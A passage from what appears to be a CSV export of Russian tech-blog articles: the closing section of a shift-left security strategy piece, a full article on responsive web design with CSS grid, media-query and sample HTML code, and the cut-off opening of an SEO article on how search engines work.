инструменты сканирования — Ручные процедуры утверждения — Ограниченная интеграция — Интегрированные инструменты безопасности — Автоматические системы безопасности — Опции самообслуживания — Комплексная автоматизация — Политика как код — Превентивный контроль Измерение — Подсчет уязвимостей — Аудиты — Ручная отчетность — Отслеживание задолженности по безопасности — Метрики процессов — Автоматизированные панели мониторинга — Метрики, основанные на оценке рисков — Меры воздействия на бизнес — Предиктивная аналитика Управление — Традиционные политики безопасности — Ручная комплаенс‑проверка — Централизованный контроль — Современные стандарты безопасности — Автоматический комплаенс — Федеративное управление — Адаптивные политики — Непрерывный комплаенс — Распределенное владение Передовые методы интеграции безопасности По мере вашего роста и развития, рекомендую обратить внимание на следующие передовые методы интеграции безопасности:Безопасность инфраструктуры как кода (IaC):a) Политики безопасности, закодированные в виде определений инфраструктуры b) Автоматическая комплаенс‑проверка для облачных ресурсов c) Проверка безопасности перед развертываниемБезопасность как код a) Требования безопасности, определенные в машиночитаемых форматах b) Автоматизированное тестирование средств контроля безопасности c) Конфигурация безопасности с контролем версийПостоянный комплаенс‑контроль a) Комплаенс‑дашборд в режиме реального времени b) Автоматизированный сбор доказательств c) Проверка непрерывности контроляСамоорганизующиеся системы безопасности a)Порталы безопасности, ориентированные на разработчиков b) Инструменты тестирования безопасности по запросу c)Автоматическое руководство по обеспечению безопасностиX. Вывод: Ориентируйтесь в ландшафте рисков Переход от реактивной безопасности к управлению рисками по методологии «Shift‑Left» — это не просто смена методологии, а глубочайшее переосмысление того, как мы создаем и поддерживаем бизнес‑ценности безопасности с помощью технологий. Как в процветающих городах безопасность учитывается на всех этапах городского планирования, строительства и текущей эксплуатации, так и наш подход к разработке должен перейти от тестирования безопасности на поздних стадиях к комплексному управлению рисками, что позволит нам непрерывно внедрять инновации.Видение преобразованного предприятия Безопасность, которая ускоряет, а не ограничивает инновацииАвтоматизированный контроль, обеспечивающий соответствие требованиям без ручного вмешательства Прозрачные показатели безопасности, на основе которых принимаются решения, также основанные на оценке рисковВовлеченные команды, разделяющие ответственность за безопасность Архитектура, предназначенная для защиты, но при этом сохраняющая гибкостьНадежная основа безопасности, обеспечивающая постоянное соблюдение всех требованийВ процессе работы сотрудники подразделения безопасности перестают быть просто блюстителями закона, подобно Красной Королеве, и начинают играть роль, больше напоминающую услужливого, но ненавязчивого Чеширского Кота. Они развивают сотрудничество, учитывают контекст и постоянно совершенствуются, создавая не только безопасные технологические решения, но и устойчивую цифровую экосистему, способную адаптироваться к угрозам завтрашнего дня.Основные рекомендации для технологических лидеров Начните с понимания склонности бизнеса к риску, а не только с технического контроляПриведите показатели безопасности в соответствие с бизнес‑результатами, чтобы получать значимую информацию Обеспечьте наличие платформ и шаблонов безопасности, которые упростят процесс безопасной разработкиИзмерьте, что действительно важно, связав метрики безопасности с их влиянием на бизнесИнвестируйте в безопасность и формируйте культуру, которая охватывает всю организациюСоздавайте условия для безопасного развития, используя автоматические комплаенс и верификациюРегулярно делитесь информацией и масштабируйте успешные подходы к обеспечению безопасностиПомните, что процесс преобразования не происходит в одночасье, подобно тому, как великие города строятся не за один день. Важно начать действовать уже сейчас, двигаться к намеченной цели и сохранять фокус на достижении желаемых бизнес‑результатов, одновременно обеспечивая надежную защиту. Следуя этому подходу, вы создадите не только безопасный технологический ландшафт, но и процветающую экосистему, которая обеспечит успех вашей организации в будущем — безопасно и с уверенностью.Призыв к действию: начинаем трансформацию Оцените текущую степень зрелости вашей интеграции в систему безопасностиОпределите наиболее актуальные возможности для улучшения безопасностиСоздайте альянс лидеров бизнеса, технологий и безопасностиОпределите область с высокой отдачей для первоочередного вниманияУстановите четкие показатели, чтобы измерить прогресс в области безопасности.Активно делитесь успехами и новыми знаниямиРаспространяйте проверенные шаблоны в масштабах всей организации Не забывайте о постоянной работе над улучшением безопасности Организации, которые успешно проведут эту трансформацию, получат значительные конкурентные преимущества. Они смогут быстрее и безопаснее поставлять программное обеспечение, более эффективно использовать инвестиции в безопасность, лучше соответствовать нормативным требованиям, создавать условия для безопасных инноваций и достичь большей согласованности между различными аспектами безопасности в рамках бизнеса.Начинать нужно сейчас. Будущее состояние безопасности вашей организации зависит от фундамента, который вы закладываете сегодня. Станьте главным связующим звеном между бизнесом и разработкой, и узнайте, почему оценки проектов часто ошибочны и как учитывать человеческий фактор для более реалистичного планирования. Записывайтесь на открытый урок:14 апреля. Почему ваши оценки проекта всегда ошибочныБольше открытых уроков по разработке и управлению — в календаре мероприятий."
8,Отзывчивый дизайн для веб-приложений: как обеспечить доступность на всех устройствах? Принципы отзывчивого дизайна,Beget,+7 (800) 700-06-08,0,"Веб-разработка, Связь и телекоммуникации, Домены и хостинг",2025-04-10,"Отзывчивый дизайн — это подход к веб‑разработке, который позволяет создавать сайты, автоматически подстраивающиеся под размеры экрана устройства пользователя. С каждым годом количество вариантов растёт — от смартфонов до умных телевизоров. Поэтому адаптированный и отзывчивый дизайн стал основой успешных веб проектов.Поскольку технологии, связанные с пользовательским интерфейсом, влияют на всех этапах создания приложения, отзывчивый дизайн — это не только инструменты разработчика, но и принципы проектирования, которые нужно учитывать на ранних этапах проекта. Мы считаем, что изучение новых подходов — это не только способ сделать продукты удобными, но и ключ к более эффективному взаимодействию в команде.В этой статье мы хотим поговорить о проектировании и разработке отзывчивых приложений. Если вы тоже хотите делать удобные интерфейсы, просим под кат.Краткая история  Еще 15 лет назад, когда первые айфоны ввозились в Россию частниками и требовали установки джейлбрейка для работы с местными сотовыми операторами, большинство сайтов не могло похвастаться удобным интерфейсом в мобильном браузере. Открываешь страницу — а на ней ужасно мелкий текст, который невозможно прочесть, или горизонтальный скролл в дополнении к привычному вертикальному. А иногда и скролла нет. Для больших картинок эта проблема актуальна и по сей день. Скриншоты страницы с широкой картинкой, которую невозможно прокрутить по горизонтали  Но количество пользователей смартфонов росло, и статистика посещений сайтов подсказывала бизнесу, что мобильная версия становится всё более востребована. Сейчас больше половины посещений веб‑страниц происходит через браузеры смартфонов. Поэтому нам нужно поддерживать разные размеры экранов для адекватного отображения контента.  Статистика запросов по данным https://radar.yandex.ru/HTML или текст по умолчанию «отзывчивы»: строки текста могут иметь любую ширину и занимают всё отведенное им пространство. Но стоит сравнить книгу и журнал и мы увидим, что для удобного чтения нужно разбить текст на не слишком длинные и не слишком короткие строки, поэтому шаблон страницы меняется в зависимости от её физического размера. На сайтах всё очень похоже, только иногда по бокам остаётся много пустого места.Первое, что придумали веб‑разработчики — это адаптивный дизайн (adaptive design). Конечно, правильный перевод — это дизайн, адаптированный к новым размерам экрана, но как это часто бывает в айти, здесь закрепилось испольование англицизма. Адаптивный дизайн основан на создании отдельных шаблонов страниц, по которым генерируется контент сайта, а также отдельных файлов стилей и скриптов. Получая запрос от браузера, серверное приложение определяет, какие темплейты использовать, чтобы вернуть правильный http‑response. И для каждого поддерживаемого браузера, для каждого типа контента нужно было делать отдельные заготовки. При этом одна часть кода, стилей и скриптов дублировалась, а другая отличалась, и это затрудняло разработку и сопровождение проекта.А затем пришли новые смартфоны разных размеров, планшеты, 4К мониторы и часы — вариантов экранов появилось так много, что поддерживать подобный подход стало совершенно невыгодно. На смену ему пришел отзывчивый дизайн (responsive design). Для его реализации используется общий код сайта и общий css, и совсем не используются скрипты. Всё это стало возможным благодаря новым стандартам CSS, и их поддержке в веб‑браузерах.Раньше приходилось устанавливать расширения для разработчиков, которые позволяли изменять поле User‑Agent в запросе к серверу. Тогда сервер распознавал request как запрос от «мобильного браузера» и генерировал ответ, используя шаблоны адаптивного дизайна. Отзывчивый дизайн проще проверять и отлаживать, т.к. вы можете изменить размер окна браузера прямо на своем рабочем месте. Для примера, вы можете прямо сейчас изменить ширину окна и увидеть как изменится интерфейс этой страницы. Кстати, на многих сайтах при уменьшении ширины окна скрываются боковые блоки с рекламой.Почему важно обсуждать новые технологии с точки зрения разных специалистов  Представьте себе ситуацию, когда команда работает над новым веб приложением. Дизайнеры с энтузиазмом создают яркие и креативные макеты, полные уникальных анимаций и сложных графических элементов. Они уверены, что их работа станет настоящим шедевром, который привлечет пользователей своим визуальным стилем. В процессе обсуждения дизайнеры акцентируют внимание на том, как важно сделать интерфейс «красивым» и «запоминающимся».Однако разработчик, получивший эти макеты для реализации, сталкивается с рядом проблем. Например, один из экранов приложения включает в себя сложную анимацию перехода между состояниями, которая выглядит великолепно на статичном изображении, но оказывается труднореализуемой с точки зрения кода. Более того, некоторые элементы дизайна не учитывают разные размеры экранов: кнопки слишком маленькие для использования на смартфонах, а текст — слишком мелкий для чтения.В результате разработчик вынужден сообщить команде о необходимости пересмотра дизайна. Это приводит к разочарованию и недопониманию: дизайнеры не понимают, почему их идеи нельзя реализовать так, как они задумали. Разработчик же чувствует давление из‑за нехватки времени на доработку.Мы уверены, что если дизайнеры познакомятся со стандартными — быстрыми — техническими возможностями, а разработчики посмотрят на проектирование интерфейса глазами дизайнера, то им будет легче договориться. И это поможет избежать ненужных переделок и сохранить творческий настрой.Проектирование отзывчивого дизайна  Теперь поговорим о том, как создаётся отзывчивый дизайн для веб‑приложения. Он должен обеспечивать оптимальное взаимодействие пользователю на различных устройствах. Это означает, что изображения, текст и другие элементы контента меняют свое расположение и пропорции в соответствии с размером экрана и его разрешением, подстраиваясь под высоту и ширину области отображения.Итак, как сделать отзывчивое приложение? Все начинается с проектирования интерфейса. В дизайне нужно учитывать несколько принципов:Проектируем страницы для разных типоразмеров;Учитываем особенности навигации;Адаптируем экраны с формами;Начинаем с «мобилки».Рассмотрим каждый из них подробнее.Дизайн для разных типоразмеров экранов  Первое, о чем необходимо подумать — это вайрфрейм дизайн верхнего уровня, структура страницы для экранов различного размера. Стандартный подход сейчас предлагает поддерживать от 3 до 5 различных размеров экрана. Они определяются в основном по ширине и высоте области отображения страницы.Для ширины выбираются следующие граничные значения:маленькие — от 320 px или 480 px;средние — 768 px;нормальные — 1024 px;большие — 1280 px, 1600 px;очень большие — 1920 px.Эти значения называют breakpoint»ы, и используют их в запросах media query.Иногда макеты разных типоразмеров называют как устройства, из‑за которых они появились: «смартфоны, планшеты, нетбуки, компьютеры и 4К‑мониторы». Эти названия подразумевают дополнительные сведения о вариантах использования, скорости и методах взаимодействия, которые могут оказаться неверными. Поэтому лучше использовать названия вариантов дизайна по размеру.Отдельного дизайна (или хотя бы проверки применимости маленького макета) требует вариант отображения с небольшой высотой. Легко представить его как сайт, открытый на смартфоне в пейзажной ориентации. Для такого макета нельзя использовать фиксированные колонтитулы (хидер и футер), даже если на всех остальных макетах они подходят.Проектируем навигацию  Следующее, что нужно продумать — это навигационные элементы. Важно обеспечить возможность перемещения по разделам приложения на всех экранах. В привычном вебе меню отображается часто в шапке сайта: логотип, он же ссылка на home, и далее основные разделы, иногда с подразделами в виде выпадающих списков. Для экранов смартфонов меню прячется под кнопку гамбургера, и отображается поверх остального контента только по нажатию пользователем. Благодаря своей компактности и удобству, гамбургер‑меню быстро завоевало популярность в мобильных сайтах и сейчас превратилось в стандартное решение для маленьких экранов. Мы считаем, что не обязательно делать его на чистом css, без javascript. Но это возможно, и если хотите, мы напишем об этом в одной из следующих статей.Для средних экранов можно выбрать промежуточное решение. Важно обратить внимание на выпадающие списки, поскольку они могут оказаться выше области отображения, и в таких случаях на них должен работать скролл.Еще одна часть системы навигации на сайте — это хлебные крошки, их часто используют на больших экранах. Так называют ссылки, показывающие вложенность разделов сайта на навигационном пути пользователя к текущей странице. На мобильных экранах хлебные крошки обычно прячут, т.к. нет места для их удобного отображения и использования. Даже если вы сможете показать несколько строк со ссылками, нажимать на них пальцем будет неудобно.Пример хлебных крошек с сайта JustinmindВ нижней части сайта (подвал или футер) обычно располагается менее востребованная, но важная информация: контактные данные, ссылки на вакансии компании, копирайт, настройки. Если ссылок много, то в мобильной версии обычно отображается только самое необходимое, либо создается промежуточная страница с дополнительной информацией. Некоторые дизайнеры вообще отказываются от футера и перемещают все ссылки в боковые меню, а при скролле вниз подгружают дополнительный контент. При проектировании верхнего и нижнего колонтитула важно продумать, в каких случаях они могут фиксироваться в видимой области экрана, а в каких — скрываться или прокручиваться вместе с основным контентом.Адаптируем экраны с формами  Еще один важный пункт, который требует внимательной проработки для создания отзывчивого интерфейса, — это веб‑формы. Без них невозможно обойтись: каким бы ни было ваше приложение, вы обязательно сделаете форму регистрации и редактирования профиля. Кроме этого, часто встречаются формы поиска, пользовательские чаты, формы обратной связи или чаты с поддержкой, анкеты и форма оформления покупки. Всё это должно хорошо отображаться и работать на всех экранах. Нет ничего более досадного, чем сделать сайт, полный функционала, на котором пользователь не смог пройти регистрацию из‑за неудобной формы, или не сумел оформить покупку из‑за неработающей формы оплаты.В отличии от карточек товаров, блоков новостей и меню, формы — это страницы, которые можно делать вертикальным списком из элементов ввода данных с отступами по бокам. При уменьшении экрана сначала уменьшаются отступы, а потом сужается форма.Для всех имеющихся кнопок и ссылок необходимо выполнить дизайн, который позволит удобно пользоваться ими на устройствах с тачскрином. Раньше это означало существенно большую, чем на десктопах, область взаимодействия с контролом. Парадокс, но кнопки на маленьких экранах нужны больше! Однако, теперь подобная проблема почти никогда не возникает, потому что выполняется четвертый принцип:Сначала проектируем для «мобилки»  При проектировании дизайна основного содержимого лучше начать с «мобильной версии» — самого маленького экрана в портретной ориентации. Раньше пользователи просматривали сайты с десктопных браузеров, и они открывали по несколько страниц из результатов поиска. Если сайт долго загружался, то пользователь переходил к следующему, а к этому возвращался позже. С переходом на мобильные устройства поведение по умолчанию изменилось: теперь пользователи не открывают много страниц разом, а предпочитают открывать по одной ссылке из топа выдачи. Если приложение долго загружается, то пользователь закрывает страницу и открывает следующую ссылку из поиска. Медленный сайт теряет шанс на просмотр. Именно поэтому необходимо делать веб‑приложение, адаптированное к мобильным устройствам и по размеру исходников, и по скорости отображения, и по дизайну интерфейса. Необходимо с одной стороны показать всю важную информацию на маленьком экране, а с другой — не перегружать интерфейс и внимание пользователя избытком элементов.Подход Mobile First помогает сосредоточиться на основном содержимом. Применение этого принципа начинается еще на этапе анализа и влияет не только на отображение элементов интерфейса, но и на формулировки юс‑кейсов и выбор данных.После проектирования отдельных компонентов можно заняться созданием композиций. Для маленьких экранов мы собираем последовательность блоков. На экранах большого размера эти блоки можно будет скомпоновать в более сложную структуру, например, за счет использования сеточной верстки.Разработка отзывчивого дизайна  Когда у нас спроектирован интерфейс, можно приступать к разработке. Чтобы сделать отзывчивый дизайн, можно использовать напрямую средства css, а можно подключить библиотеки, которые облегчают написание кода. Основные возможности, благодаря которым мы реализуем отзывчивый интерфейс, следующие: мета тег viewport, grid view и box‑sizing, media query. Рассмотрим подробнее, как они работают. Что делает viewport  Meta тег viewport позволяет задать начальное масштабирование контента и ширину. Размеры элементов: шрифтов, блоков, картинок могут задаваться в пикселях, но физический размер пикселей на устройствах отличается. Это зависит от плотности пикселей: на экранах ретина или 4К плотность выше, поэтому без указания масштабирования текст становится чересчур мелким для чтения. Браузер может вычислить соответствие между указанным (или взятым из значений по умолчанию) размером в пикселях, и соответствующим ему ожидаемому размеру в реальном мире. Благодаря установке initial-scale=1, мы получаем читабельные тексты и нормальные размеры для всех элементов, чьи размеры указаны в пикселях.  <meta name=""viewport""content=""width=device-width, initial-scale=1.0"" />Примеры с сайта W3Schools  Поскольку у нас есть такой инструмент, мы можем легко сделать на экранах с различной плотностью пикселей масштабирование объектов, чьи размеры заданы в абсолютных величинах. Это стоит учитывать в дизайне и не задавать непропорциональные размеры шрифтов или блочных элементов. Как используются grid view и box-sizing  Box-sizing это свойство блочных элементов, которое позволяет установить, как правильно рассчитать размер блока. Значение по умолчанию это content-box, оно означает, что ширина и высота блока соответствуют размерам его внутреннего содержимого. И при отображении блока, к его размеру добавляются внутренние отступы (padding) и границы. Если мы хотим, чтобы размеры, указанные через width и height, включали в себя padding и border, нужно использовать значение border-box. Удобно задать его для всех элементов сразу, используя вайлдкард *.* { box-sizing: border-box; }Grid view помогает нам реализовать дизайн, который можно наложить на сетку. Представьте таблицу: какие-то ячейки объединены по вертикали, какие-то по горизонтали. У каждой получившейся области есть свой идентификатор. И любой блок на странице помещается в соответствующую область указанием этого идентификатора..item1 { grid-area: header; } .item2 { grid-area: menu; } .item3 { grid-area: main; } .item4 { grid-area: right; } .item5 { grid-area: footer; }  .grid-container {   grid-template-areas:     'header header header header header header'     'menu main main main main right'     'menu footer footer footer footer footer'; }Пример расположения элементов по именованной сетке 6х3.  Мы можем не задавать имена отдельным ячейкам, а указать только количество колонок в сетке, и далее размещать элементы в ней. Строка будут добавляться при заполнении предыдущей, и общее количество строк вычисляется автоматически. Неименованные колонки можно задавать точками. Если в такой сетке нужно указать блоку расположение, требующее «слияния» ячеек, то используются свойства, наподобие координат, задающие верхний левый угол блока и нижний правый угол. Координат служат воображаемые линии между колонками и строками, занумерованными от 1. Например, укажем значения grid-row-start, grid-column-start, grid-row-end и grid-column-end, используя короткую запись grid-area. Следующий код делает точно такую же композицию, как на картинке выше:.container { display: grid; grid-template-areas:     '. . . . . .'; } .item1 { grid-area: 1 / 1 / 2 / 7; } .item2 { grid-area: 2 / 1 / 4 / 2; } .item3 { grid-area: 2 / 2 / 3 / 6; } .item4 { grid-area: 2 / 6 / 3 / 7; } .item5 { grid-area: 3 / 2 / 4 / 7; }Количество строк и колонок в сетке Grid контейнера может быть любым, а если нужна только одна колонка или только одна строка, то можно использовать более простой шаблон под названием flex container.   .flex-container {   display: flex;   flex-direction: row; }У flex контейнера есть свойства, позволяющие определить порядок наполнения и относительные или абсолютные размеры элементов. Все дивы внутри блока‑контейнера называются flex item»ами и имеют свойства для позиционирования внутри контейнера и изменения порядка. Но это уже особенности реализации. Вернемся к нашему разговору о том, что мы можем сделать легко и просто, чтобы реализовать отзывчивый интерфейс сложнее одномерного списка блоков. Итак, представим, что у нас есть сетка как в первом примере, и теперь мы хотим сделать дизайн для экрана шире и уже задизайненного брейкпоинта. Тут‑то нам и пригодится Media query.Какие возможности даёт Media query  Media query это инструмент css3, который позволяет описывать правила или условия, при выполнении которых будет применяться вложенный код css‑стилей. Это условный оператор в коде css! Например, если ширина окна браузера не более 600px, то мы можем перестроить структуру grid контейнера, так чтобы каждая зона занимала целую строку:@media only screen and (max-width: 600px) {   .grid-container {     grid-template-areas:       'header'       'menu'       'main'       'right'       'footer';   } }Упрощенная структура для интерфейса на маленьком экранеИли мы можем описать расположение item»ов таким образом, чтобы каждый занимал, к примеру, 6 колонок — результат будет тот же.@media only screen and (max-width: 600px) {   .item1 { grid-area: 1 / span 6; }   .item2 { grid-area: 2 / span 6; }   .item3 { grid-area: 3 / span 6; }   .item4 { grid-area: 4 / span 6; }   .item5 { grid-area: 5 / span 6; } }А что делать с очень широкими экранами? Самый простой вариант — задать максимальную ширину для контейнера, и установить внешние боковые отступы в auto, тогда слева и справа останется поровну пустого места, а всё содержимое сайта отобразится по центру. Кроме того, мы можем задать ширину отдельных колонок (например, меню и правого сайдбара), и тогда колонка с основным содержимым будет подстраиваться по ширине, растягиваясь между фиксированными боковыми колонками.@media only screen and (min-width: 800px) {     .container {         max-width: 1000px;         margin: 0 auto;         grid-template-columns: 150px auto auto auto auto 160px;     } }При ширине страницы больше, чем max-width контейнера, по бокам появляются отступыПолный код страницы выглядит так:  <!DOCTYPE html> <html lang='en-US'> <head> <meta content='width=content-width' name='viewport'/>  <style> body {     background-color: #fcfcff;     font-family: sans-serif; }  * {     margin: 0;     box-sizing: border-box; }  .container {     display: grid;     gap: 10px;     padding: 10px;     grid-template-areas: '. . . . . .'; }  .container > div {     padding: 10px;     font-weight: bold;     color: white;     min-height: 100px; }  .item1 { grid-area: 1 / 1 / 2 / 7; } .item2 { grid-area: 2 / 1 / 4 / 2; } .item3 { grid-area: 2 / 2 / 3 / 6; } .item4 { grid-area: 2 / 6 / 3 / 7; } .item5 { grid-area: 3 / 2 / 4 / 7; }  .container > div.item5 {     color: #444; }  .item1 { background-color: #1D4FD8; } .item2 { background-color: #4F1DDA; } .item3 { background-color: #2C0A8D; } .item4 { background-color: #037C87; } .item5 { background-color: #6DDDE8; }  .item2 ul li {     list-style: none;     padding: 0 0 10px; } .item2 ul {     padding: 0; }  @media only screen and (max-width: 600px) {   .item1 { grid-area: 1 / span 6; }   .item2 { grid-area: 2 / span 6; }   .item3 { grid-area: 3 / span 6; }   .item4 { grid-area: 4 / span 6; }   .item5 { grid-area: 5 / span 6; } }  @media only screen and (min-width: 800px) {     .container {         max-width: 1000px;         margin: 0 auto;         grid-template-columns: 150px auto auto auto auto 160px;     } } </style>  </head> <body> <div class=""container"">   <div class=""item1"">Лого и заголовок</div>   <div class=""item2"">  <ul>  <li>Меню 1</li>  <li>Меню 2</li>  <li>Меню 3</li>     </ul>   </div>   <div class=""item3"">Основной контент</div>   <div class=""item4"">Колонка справа</div>   <div class=""item5"">Нижний колонтитул</div> </div> </body> </html>Главный принцип создания отзывчивого приложения — тестирование  Приложение — не напечатанная книга, дизайн — не статическая картинка, сайт обретает ценность только в процессе использования. Поэтому и в проектировании, и в разработке необходимо уделить внимание удобству взаимодействия с интерфейсом. Перед тем как передавать результат своей работы дальше — нужно проверить, может ли пользователь решить свою проблему, используя наше приложение? Можно ли сделать то же самое проще? И если дизайнер задастся этим вопросом прежде, чем отдать дизайн в разработку, а разработчик проверит приложение прежде, чем передать задачу в тестирование — вся команда сможет гордиться своей работой.То же самое касается и тестирования перед публикацией приложения для пользователей. Необходимо проверить следующие аспекты:Просмотрите сайт на различных устройствах: откройте сайт на своем смартфоне, планшете, Smart TV и т. д., чтобы убедиться, что он масштабируется надлежащим образом.Попробуйте изменять размер окна браузера, чтобы посмотреть, как меняется структура отображения.Попробуйте увеличивать или уменьшать масштаб изображения. Нажмите Command + на Mac или Control + на Windows, чтобы увеличить масштаб, и Command — или Control — для уменьшения, чтобы убедиться, что все нужные элементы видны и доступны.Используйте Inspector в браузере для проверки дизай. В большинстве браузеров нажмите клавишу F12 или щелкните правой кнопкой мыши на странице и выберите Inspect, чтобы открыть инструменты разработчика. Нажмите на значок устройства, обычно это телефон или планшет, на панели инструментов разработчика, чтобы перейти в режим проверки отзывчивого дизайна. Измените ширину экрана, и посмотрите, как меняется сайт.Итоги  Но почему так важно опираться на стандартные подходы? Не только потому что это быстрее кодить, а потому что приложение, созданное на основе стандартных средств, быстрее работает. Когда появились первые смартфоны, разработчиком приходилось изобретать решения. Удобные, быстро реализуемые решения стандартных задач распространялись и включались в технологический стек сначала на уровне библиотек или систем управления контентом, таких как WordPress, Drupal. Но масштаб изменился, и сейчас отзывчивый дизайн это требование, которое реализуется на уровне языков и браузеров.В итоге, освоение принципов адаптивного дизайна и базовых технологий открывает перед нами новые горизонты в разработке веб‑приложений. Мы не только создаём удобные интерфейсы для пользователей, но и строим более эффективное взаимодействие внутри команды. "
9,Как работают поисковики: 4 точки зрения (ни одной правильной),AGIMA,Крупнейший интегратор digital-решений,0,"Веб-разработка, Дизайн и юзабилити, Поисковые технологии",2025-04-10,"Привет! Меня зовут Андрей Попов, я SEO-специалист в AGIMA. В современном мире несколько подходов к пониманию поисковых систем вроде Google и Яндекс. Каждый из них имеет право на существование, у каждого свои апологеты и противники. Но, скорее всего, в этом вопросе истина лежит где-то посередине, а абсолютной правды не знает никто.В этой статье расскажу, как работают поисковики по версии их разработчиков, по мнению SEO-специалистов и по данным официальных гайдов. А в конце приведу универсальную точку зрения, в которой лично я нахожу гармонию и баланс. Вряд ли что-то в этом обзоре вас удивит, но вопрос в любом случае спорный — интересно будет обсудить.Поисковые системы развиваются, и с каждым годом поиск информации становится всё более интуитивным и эффективным. Но есть у этой медали и оборотная сторона: вопрос о том, как работают поисковые системы, тоже с каждым годом становится всё сложнее. А искать на него ответ, когда работаешь в SEO, приходится ежедневно.Что мы знаем достоверно: представление о работе алгоритмов Google и Яндекса очень сильно зависит от того, кто о них говорит. А регулярно говорят о них несколько категорий экспертов:официальные представители Google и Яндекса;инженеры этих же компаний;мои коллеги SEO-специалисты;те, кто изучает реальное поведение поиска (тоже SEO-специалисты).Разберем, что говорят все эти люди и кому из них можно верить.Дисклеймер: к каждому блоку прикрепляю одну-две ссылки с пруфами, но вообще информация собиралась по крупицам в разных источниках. Причем про Google мы знаем чуть больше — просто потому что информацию о нем ищут во всем мире, а не только в России.Точка зрения №1. Официальные представители поисковиковПредставьте, что поисковик — это очень внимательный библиотекарь, который знает содержание миллионов книг. Когда вы задаете вопрос, он мгновенно находит самые подходящие ответы. Вот примерно  так и объясняют работу алгоритмов сотрудники Google и Яндекс.По их словам, поиск начинается с «пауков» — специальных программ, которые постоянно путешествуют по интернету, переходя по ссылкам и запоминая содержимое сайтов. Они заглядывают на каждую страницу, словно рассматривая её через увеличительное стекло, и сохраняют информацию в гигантской базе данных — индексе.Когда вы вводите запрос, система не ищет по всему интернету в реальном времени. Вместо этого она проверяет индекс — как бы листает каталог библиотеки. Алгоритмы анализируют миллионы факторов, чтобы выбрать самые полезные страницы. Главные критерии — это соответствие вашему запросу и качество контента.Сотрудники поисковиков всегда подчеркивают, что системы не просто ищут ключевые слова. Они пытаются понять смысл вопроса. Например, если вы напишете в поисковой строке «почему небо голубое», алгоритм найдет научное объяснение, а не страницы, где просто много раз повторяются эти слова.Важнее всего для поисковиков — удовлетворенность пользователей. Поэтому они следят, как люди взаимодействуют с результатами: если многие быстро возвращаются к поиску, значит, страница не ответила на вопрос и ее позиции понизятся. Также системы ценят сайты с удобным оформлением, быстрой загрузкой и достоверной информацией.Откуда мы про это знаем: вот тут можно найти разбор некоторых цитат руководителей Google.Точка зрения №2. Инженеры Google и ЯндексаДля создателей поисковых систем их детище — это не просто программа, а интеллектуальный помощник. Он должен понимать людей почти как живой собеседник. Инженеры мечтают о поисковике, способном читать между строк и предугадывать потребности пользователей. Главная задача идеального поиска, по мнению разработчиков, не просто находить слова из запроса, а понимать их истинный смысл. Например, когда человек спрашивает «как приготовить пирог», система должна учитывать несколько факторов. Возможно, он новичок и ему нужен простой рецепт? Или у него аллергия на определенные продукты? Или он ищет вариант без духовки? Такой поиск требует настоящего искусственного интеллекта, способного анализировать контекст.Инженеры стремятся к системе, которая работает как идеальный библиотекарь: она не просто выдает книги по запросу, а может порекомендовать то, о чем читатель даже не догадывался. Например, на запрос «лучшие курорты» она предложит варианты, подходящие именно вам — с учетом вашего бюджета, предпочтений и предыдущих поездок. Разработчики поисковых систем заглядывают в будущее и представляют, каким станет поиск через несколько лет. Это будет не просто строка для ввода запроса, а настоящий умный помощник.Сейчас поиск работает по определенным правилам, которые прописали программисты. Но скоро все изменится — искусственный интеллект сам будет учиться понимать, что нам нужно. Он сможет улавливать смысл, а не просто искать слова из запроса. Например, если написать «что почитать ребенку 5 лет», система поймет, что нужны не просто книги, а подходящие по возрасту сказки с картинками.Современный поиск разделяет текст, картинки и видео. В будущем система будет искать всё сразу и понимать связь между разными форматами. Спросите про Эйфелеву башню — и получите не только статьи, но и подборку лучших фото, видео с разных ракурсов, даже аудиогиды.Самое интересное — поиск станет предугадывать наши вопросы. Система будет предлагать помощь еще до того, как мы что-то спросим. Например, если вы часто ищете рецепты, утром она может сама показать варианты завтраков. А если ответ непонятен — можно будет просто переспросить, как в разговоре с человеком.Такое будущее уже не за горами. Скоро поиск станет не инструментом, а настоящим цифровым помощником, который действительно понимает нас с полуслова.Важнейший принцип для разработчиков — абсолютная объективность. В их идеальном мире поисковая выдача не должна зависеть от коммерческих договоренностей или чьих-то личных предпочтений. Только факты, только релевантность, только польза для пользователя.Но самое главное — инженеры хотят создать поиск, который учится вместе с человечеством. Который сегодня может объяснить теорию относительности школьнику, завтра — помочь ученому сделать открытие, а послезавтра — подсказать решение бытовой проблемы. Поиск, который становится умнее, добрее и полезнее с каждым днем.Откуда мы про это знаем: вот один из разборов цитат инженеров, а вот некоторые выводы из сливов документов Google.Точка зрения №3. SEO-специалистыSEO-специалисты смотрят на поисковые системы как на сложный пазл, который нужно разгадать. Они знают официальные правила Google и Яндекса, но при этом ищут и скрытые закономерности, которые помогают сайтам попадать в топ выдачи.Многие SEO-эксперты представляют поисковик как строгого учителя, который ставит оценки сайтам по сотням разных критериев. Они пытаются угадать, какие именно факторы важнее всего: может быть, количество ссылок на сайт, или скорость загрузки страницы, или время, которое пользователи проводят смотрят материалы. При этом они понимают, что правила оценки постоянно меняются, и то, что работало вчера, может не сработать завтра.SEO-специалисты часто сравнивают свою работу с садоводством. Они «выращивают» позиции сайта, заботясь о множестве деталей: «удобряют» контент ключевыми словами, «поливают» его внутренними ссылками, «подрезают» технические недочеты. При этом они знают, что даже самый ухоженный «сад» может не дать урожая, если алгоритмы поисковиков решат изменить правила.Многие в SEO-сообществе считают, что поисковые системы — это не просто нейтральные технические инструменты, а сложные экосистемы со своими интересами. Они замечают, что коммерческие запросы часто приводят в топ крупные компании, а не самые полезные сайты, и пытаются найти способы «договориться» с алгоритмом.Главное, что отличает мышление SEO-специалиста — это постоянные эксперименты. Они пробуют разные подходы, анализируют результаты и делают выводы, создавая свою собственную карту подводных течений в поисковой выдаче. При этом они понимают, что полностью разгадать алгоритм невозможно — можно лишь найти работающие закономерности.Откуда мы это знаем: вот пример кейса от SEO-специалистов.Точка зрения №4. Как поисковики работаю на самом делеРеальность — это, как обычно, компромисс между тем, что говорят сами компании, техническими возможностями и рыночными условиями. Вот какие закономерности замечают исследователи поисковиков:Поисковики действительно стремятся к релевантности, но их алгоритмы не идеальны — иногда в топ пробиваются сайты с агрессивным SEO.ИИ играет огромную роль, но не заменяет полностью ручные фильтры и модерацию (например, санкции за спам).SEO-оптимизация работает, но правила постоянно меняются — то, что давало результат вчера, завтра может привести к санкциям.Коммерческие факторы влияют на поиск — крупные бренды и платные партнеры иногда получают преимущество, даже если их контент не самый лучший.Откуда мы про это знаем: вот полный разбор одной из утечек данных по работе Google, можно прочитать с переводчиком.Так чья правда ближе к реальности?Точно 